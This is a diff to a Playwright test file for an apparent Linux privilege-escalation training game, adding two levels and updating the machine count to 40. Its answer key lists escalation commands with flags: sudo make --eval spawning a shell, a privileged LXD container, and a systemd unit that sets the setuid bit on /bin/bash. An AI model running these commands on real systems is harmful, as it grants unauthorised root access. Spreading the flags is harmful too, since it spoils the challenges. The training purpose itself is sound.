@@ -83,8 +83,16 @@ const SOLUTIONS = {
     },
     38: {
         flag: 'flag{m4ke_eval_r00t}',
-        final: true,
         cmds: ['sudo make -s --eval="x:\\n\\t-/bin/sh"']
+    },
+    39: {
+        flag: 'flag{lxd_group_pwn3d}',
+        cmds: ['id', 'lxc init alpine r -c security.privileged=true']
+    },
+    40: {
+        flag: 'flag{systemd_unit_writable}',
+        final: true,
+        cmds: ['echo \'ExecStart=/bin/sh -c "chmod +s /bin/bash"\' > /etc/systemd/system/backup.service', 'wait']
     },
 };
 
@@ -115,11 +123,11 @@ for (const [id, sol] of Object.entries(SOLUTIONS)) {
     });
 }
 
-test('hub renders 38 machines across 3 tiers', async ({ page }) => {
+test('hub renders 40 machines across 3 tiers', async ({ page }) => {
     await page.goto('/');
-    await expect(page.locator('.machine-card')).toHaveCount(38);
+    await expect(page.locator('.machine-card')).toHaveCount(40);
     await expect(page.locator('.home-tier-label')).toHaveCount(3);
-    await expect(page.locator('#homeProgressText')).toHaveText('0 / 38');
+    await expect(page.locator('#homeProgressText')).toHaveText('0 / 40');
 });
 
 test('pipes: cat | wc -l counts passwd lines', async ({ page }) => {
